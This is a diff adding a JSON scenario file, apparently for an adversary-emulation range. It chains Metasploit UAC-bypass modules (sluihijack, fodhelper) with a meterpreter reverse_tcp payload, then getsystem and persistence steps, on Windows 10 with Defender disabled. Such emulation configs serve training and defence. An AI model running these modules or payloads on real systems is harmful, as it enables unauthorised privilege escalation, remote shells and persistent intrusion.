@@ -1,0 +1,214 @@
+    {
+        "windows_10_1511": {
+            "TA04_T1088_P1": {
+            "scenario_tactic": {
+                "name": "Privilege_Escalation",
+                "id": "TA0004"
+            },
+            "scenario_technique": {
+                "name": "Bypass User Account Control",
+                "id": "T1088"
+            },
+            "procedure": {
+                "classification": {
+                    "scenario_type": "active_scenario",
+                    "name": "bypassuac_sluihijack",
+                    "classification_id": "TA04_T1088_P1",
+                    "job-role": "System/Network Admin",
+                    "difficulty": "4"
+                },
+                "environment": {
+                    "platform": "Windows 10 pro",
+                    "version": "1511",
+                    "service-protocol": null,
+                    "cve": "",
+                    "configuration": {
+                        "settings": {
+                            "1": "disable defender"
+                        }
+                    }
+                },
+                "execution": {
+                    "prerequisite": [
+                        {
+                        "scenario_tactic":"Initial_Access",
+                        "proc_id": "TA01_T1091_P1",
+                        "type":"active_scenario"
+                    }],
+                    "postrequisite": [
+                        {
+                        "scenario_tactic":"Privilege_Escalation",
+                        "proc_id": "TA04_T1134_P1",
+                        "type":"helper_scenario"
+                    }
+                ],  
+                    "spawn_seperate_session": false,
+                    "tool": "metasploit",
+                    "exploit": "windows/local/bypassuac_sluihijack",
+                    "payload":"windows/meterpreter/reverse_tcp",
+                    "options": {
+                        "LHOST": "LHOST_$ref",
+                        "LPORT": "LPORT_$ref",
+                        "SESSION": "SESSION_$ref"
+                        
+                    },
+                    "access": {
+                        "access-type": "",
+                        "access-level": "",
+                        "path-execution-file": ""
+                    }
+                }
+            },
+            "dynamic_procedures": [
+                {
+                    "sub_procedure": {
+                        "proc_id": "TA03_T1050_P1",
+                        "proc_name": "persistence_service",
+                        "scenario_tactic": "Persistence"
+                    }
+                },
+                {
+                    "sub_procedure": {
+                        "proc_id": "TA03_T1060_P1",
+                        "proc_name": "persistence_exe",
+                        "scenario_tactic": "Persistence"
+                    }
+                },
+                {
+                    "sub_procedure": {
+                        "proc_id": "TA03_T1060_P2",
+                        "proc_name": "registry_persistence",
+                        "scenario_tactic": "Persistence"
+                    }
+                }
+            ]
+        },
+        "TA04_T1088_P2": {
+            "scenario_tactic": {
+                "name": "Privilege_Escalation",
+                "id": "TA0004"
+            },
+            "scenario_technique": {
+                "name": "Bypass User Account Control ",
+                "id": "T1088"
+            },
+            "procedure": {
+                "classification": {
+                    "scenario_type": "active_scenario",
+                    "name": "bypassuac_fodhelper",
+                    "classification_id": "TA04_T1088_P2",
+                    "job-role": "System/Network Admin",
+                    "Restriction": "only return cmd (meterpreter command doesn't work)",
+                    "difficulty": "4"
+                },
+                "environment": {
+                    "platform": "Windows 10 pro",
+                    "version": "1511",
+                    "service-protocol": null,
+                    "cve": "",
+                    "configuration": {
+                        "settings": {
+                            "1": "disable defender"
+                        }
+                    }
+                },
+                "execution": {
+                    "prerequisite": [
+                        {
+                        "scenario_tactic":"Initial_Access",
+                        "proc_id": "TA01_T1091_P1",
+                        "type":"active_scenario"
+                    }
+                ],
+                    "postrequisite": [
+                        {
+                        "scenario_tactic":"Privilege_Escalation",
+                        "proc_id": "TA04_T1134_P1",
+                        "type":"helper_scenario"
+                    }
+                ],
+                    "spawn_seperate_session": false,
+                    "tool": "metasploit",
+                    "exploit": "windows/local/bypassuac_fodhelper",
+                    "payload":"windows/meterpreter/reverse_tcp",
+                    "options": {
+                        "LHOST": "LHOST_$ref",
+                        "LPORT": "LPORT_$ref",
+                        "SESSION": "SESSION_$ref"
+                    },
+                    "access": {
+                        "access-type": "",
+                        "access-level": "",
+                        "path-execution-file": ""
+                    }
+                }
+            },
+            "dynamic_procedures": [
+                {
+                    "sub_procedure": {
+                        "proc_id": "TA03_T1050_P1",
+                        "proc_name": "persistence_service",
+                        "scenario_tactic": "Persistence"
+                    }
+                },
+                {
+                    "sub_procedure": {
+                        "proc_id": "TA03_T1060_P1",
+                        "proc_name": "persistence_exe",
+                        "scenario_tactic": "Persistence"
+                    }
+                },
+                {
+                    "sub_procedure": {
+                        "proc_id": "TA03_T1060_P2",
+                        "proc_name": "registry_persistence",
+                        "scenario_tactic": "Persistence"
+                    }
+                }
+            ]
+        },
+
+        "TA04_T1134_P1": {
+            "scenario_tactic": {
+                "name": "Privilege_Escalation",
+                "id": "TA0004"
+            },
+            "scenario_technique": {
+                "name": "Access Token Manipulation ",
+                "id": "T1134"
+            },
+            "procedure": {
+                "classification": {
+                    "name": "getsystem",
+                    "scenario_type": "helper_scenario",
+                    "classification_id": "TA04_T1134_P1",
+                    "job-role": "System/Network Admin",
+                    "difficulty": "3"
+                },
+                "environment": {
+                    "platform": "Windows 10 pro",
+                    "version": "1511",
+                    "service-protocol": null,
+                    "cve": "",
+                    "configuration": {
+                        "settings": {
+                            "1": "disable defender"
+                        }
+                    }
+                },
+                "execution": {
+                    "spawn_seperate_session": false,
+                    "type": "command",
+                    "service": "None",
+                    "tool": "meterpreter",
+                    "command": "getsystem",
+                    "access": {
+                        "access-type": "",
+                        "access-level": "",
+                        "path-execution-file": ""
+                    }
+                }
+            }
+        }
+    }
+}
